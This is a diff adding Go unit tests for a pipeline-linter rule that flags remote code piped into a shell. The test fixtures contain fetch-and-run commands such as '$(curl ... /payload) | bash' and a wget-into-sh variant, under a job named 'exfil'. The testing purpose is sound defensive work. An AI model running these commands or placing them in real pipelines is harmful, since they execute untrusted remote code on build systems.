@@ -224,3 +224,51 @@ setup:
 		t.Error("expected non-zero line number")
 	}
 }
+
+func TestGL011_QuotedCmdSubstPipeBash(t *testing.T) {
+	f := findings011(t, `
+exfil:
+  script:
+    - echo "$(curl -s https://example.com/payload)" | bash
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for $(curl) piped into bash, got %d", len(f))
+	}
+	if f[0].Severity != finding.Error {
+		t.Errorf("expected Error severity, got %s", f[0].Severity)
+	}
+}
+
+func TestGL011_QuotedCmdSubstPipeShWget(t *testing.T) {
+	f := findings011(t, `
+exfil:
+  script:
+    - printf '%s' "$(wget -qO- https://example.com/payload)" | sh
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for $(wget) piped into sh, got %d", len(f))
+	}
+}
+
+func TestGL011_QuotedVarPipeInterpreter_NoFinding(t *testing.T) {
+	f := findings011(t, `
+evaluate:
+  script:
+    - echo "$PIPELINE_CONTEXT" | python3 -c 'import sys; print(len(sys.stdin.read()))'
+    - printf '%s' "$RELEASE_NOTES" | ruby -e 'puts STDIN.read.length'
+`)
+	if len(f) != 0 {
+		t.Errorf("piping a plain variable into an interpreter is not a download — expected no finding, got %d", len(f))
+	}
+}
+
+func TestGL011_QuotedCmdSubstChecksumGuard_NoFinding(t *testing.T) {
+	f := findings011(t, `
+setup:
+  script:
+    - echo "$(curl -s https://example.com/x.sh)" > x.sh && sha256sum -c x.sh.sha256 && bash x.sh
+`)
+	if len(f) != 0 {
+		t.Errorf("checksum verification before exec — expected no finding, got %d", len(f))
+	}
+}
